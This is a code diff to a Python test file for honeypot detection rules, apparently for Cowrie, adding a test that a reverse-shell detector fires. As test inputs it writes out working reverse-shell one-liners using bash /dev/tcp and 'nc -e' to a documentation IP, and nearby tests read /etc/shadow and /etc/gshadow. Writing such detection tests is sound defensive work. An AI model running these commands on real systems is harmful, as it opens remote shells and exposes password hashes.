@@ -21,6 +21,7 @@ EXPECTED = {
     "scanner_noise": set(),
     "mirai_telnet": {"01_ssh_bruteforce", "04_success_after_bruteforce", "02_download_command", "03_tmp_execution",
                      "08_busybox_probe"},
+    "reverse_shell": {"13_reverse_shell"},
 }
 
 
@@ -131,3 +132,15 @@ def test_credential_file_access_detection():
     assert credential_file_access(cmd("cat /etc/shadow"))
     assert credential_file_access(cmd("grep root /etc/gshadow"))
     assert credential_file_access(cmd("cat /etc/passwd")) == []  # world-readable file, not the hashed one
+
+
+def test_reverse_shell_detection():
+    from detections.local_rules import reverse_shell
+
+    def cmd(text):
+        return [{"eventid": "cowrie.command.input", "src_ip": "203.0.113.9", "session": "s", "input": text,
+                 "TimeGenerated": "2026-09-01T10:00:00.000000Z"}]
+
+    assert reverse_shell(cmd("bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"))
+    assert reverse_shell(cmd("nc -e /bin/sh 198.51.100.9 4444"))
+    assert reverse_shell(cmd("ls -la")) == []
